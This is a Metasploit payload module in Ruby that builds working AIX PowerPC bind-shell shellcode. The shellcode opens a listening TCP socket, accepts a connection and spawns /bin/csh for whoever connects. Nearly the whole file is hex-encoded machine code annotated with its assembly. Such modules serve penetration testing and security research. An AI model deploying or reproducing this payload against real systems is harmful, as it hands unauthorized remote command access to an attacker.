##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


module MetasploitModule

  CachedSize = 264

  include Msf::Payload::Single
  include Msf::Payload::Aix
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'AIX Command Shell, Bind TCP Inline',
      'Description'   => 'Listen for a connection and spawn a command shell',
      'Author'        => 'Ramon de C Valle',
      'License'       => MSF_LICENSE,
      'Platform'      => 'aix',
      'Arch'          => ARCH_PPC,
      'Handler'       => Msf::Handler::BindTcp,
      'Session'       => Msf::Sessions::CommandShellUnix,
      'Payload'       =>
        {
          'Offsets' =>
            {
              'LPORT'    => [ 82, 'n' ],
            },
        }
    ))

  end

  def generate(*args)
    super(*args)

    payload =
      "\x7f\xff\xfa\x79"     + #   xor.    r31,r31,r31                #
      "\x40\x82\xff\xfd"     + #   bnel    <bndsockcode>              #
      "\x7f\xc8\x02\xa6"     + #   mflr    r30                        #
      "\x3b\xde\x01\xff"     + #   cal     r30,511(r30)               #
      "\x3b\xde\xfe\x1d"     + #   cal     r30,-483(r30)              #
      "\x7f\xc9\x03\xa6"     + #   mtctr   r30                        #
      "\x4e\x80\x04\x20"     + #   bctr                               #
      "\x4c\xc6\x33\x42"     + #   crorc   6,6,6                      #
      "\x44\xff\xff\x02"     + #   svca    0                          #
      "\x3b\xde\xff\xf8"     + #   cal     r30,-8(r30)                #
      "\x3b\xa0\x07\xff"     + #   lil     r29,2047                   #
      "\x7c\xa5\x2a\x78"     + #   xor     r5,r5,r5                   #
      "\x38\x9d\xf8\x02"     + #   cal     r4,-2046(r29)              #
      "\x38\x7d\xf8\x03"     + #   cal     r3,-2045(r29)              #
      @cal_socket +
      "\x7f\xc9\x03\xa6"     + #   mtctr   r30                        #
      "\x4e\x80\x04\x21"     + #   bctrl                              #
      "\x7c\x7c\x1b\x78"     + #   mr      r28,r3                     #
      "\x38\xbd\xf8\x11"     + #   cal     r5,-2031(r29)              #
      "\x3f\x60\xff\x02"     + #   liu     r27,-254                   #
      "\x63\x7b\x11\x5c"     + #   oril    r27,r27,4444               #
      "\x97\xe1\xff\xfc"     + #   stu     r31,-4(r1)                 #
      "\x97\x61\xff\xfc"     + #   stu     r27,-4(r1)                 #
      "\x7c\x24\x0b\x78"     + #   mr      r4,r1                      #
      @cal_bind +
      "\x7f\xc9\x03\xa6"     + #   mtctr   r30                        #
      "\x4e\x80\x04\x21"     + #   bctrl                              #
      "\x7c\x84\x22\x78"     + #   xor     r4,r4,r4                   #
      "\x7f\x83\xe3\x78"     + #   mr      r3,r28                     #
      @cal_listen +
      "\x7f\xc9\x03\xa6"     + #   mtctr   r30                        #
      "\x4e\x80\x04\x21"     + #   bctrl                              #
      "\x7c\xa5\x2a\x78"     + #   xor     r5,r5,r5                   #
      "\x7c\x84\x22\x78"     + #   xor     r4,r4,r4                   #
      "\x7f\x83\xe3\x78"     + #   mr      r3,r28                     #
      @cal_accept +
      "\x7f\xc9\x03\xa6"     + #   mtctr   r30                        #
      "\x4e\x80\x04\x21"     + #   bctrl                              #
      "\x7c\x7a\x1b\x78"     + #   mr      r26,r3                     #
      "\x3b\x3d\xf8\x03"     + #   cal     r25,-2045(r29)             #
      "\x7f\x23\xcb\x78"     + #   mr      r3,r25                     #
      @cal_close +
      "\x7f\xc9\x03\xa6"     + #   mtctr   r30                        #
      "\x4e\x80\x04\x21"     + #   bctrl                              #
      "\x7f\x25\xcb\x78"     + #   mr      r5,r25                     #
      "\x7c\x84\x22\x78"     + #   xor     r4,r4,r4                   #
      "\x7f\x43\xd3\x78"     + #   mr      r3,r26                     #
      @cal_kfcntl +
      "\x7f\xc9\x03\xa6"     + #   mtctr   r30                        #
      "\x4e\x80\x04\x21"     + #   bctrl                              #
      "\x37\x39\xff\xff"     + #   ai.     r25,r25,-1                 #
      "\x40\x80\xff\xd4"     + #   bge     <bndsockcode+160>          #
      "\x7c\xa5\x2a\x79"     + #   xor.    r5,r5,r5                   #
      "\x40\x82\xff\xfd"     + #   bnel    <bndsockcode+208>          #
      "\x7f\x08\x02\xa6"     + #   mflr    r24                        #
      "\x3b\x18\x01\xff"     + #   cal     r24,511(r24)               #
      "\x38\x78\xfe\x29"     + #   cal     r3,-471(r24)               #
      "\x98\xb8\xfe\x31"     + #   stb     r5,-463(r24)               #
      "\x94\xa1\xff\xfc"     + #   stu     r5,-4(r1)                  #
      "\x94\x61\xff\xfc"     + #   stu     r3,-4(r1)                  #
      "\x7c\x24\x0b\x78"     + #   mr      r4,r1                      #
      @cal_execve +
      "\x7f\xc9\x03\xa6"     + #   mtctr   r30                        #
      "\x4e\x80\x04\x21"     + #   bctrl                              #
      "/bin/csh"

      # If the payload is generated and there are offsets to substitute,
      # do that now.
      if (payload and offsets)
        substitute_vars(payload, offsets)
      end

      payload
  end
end
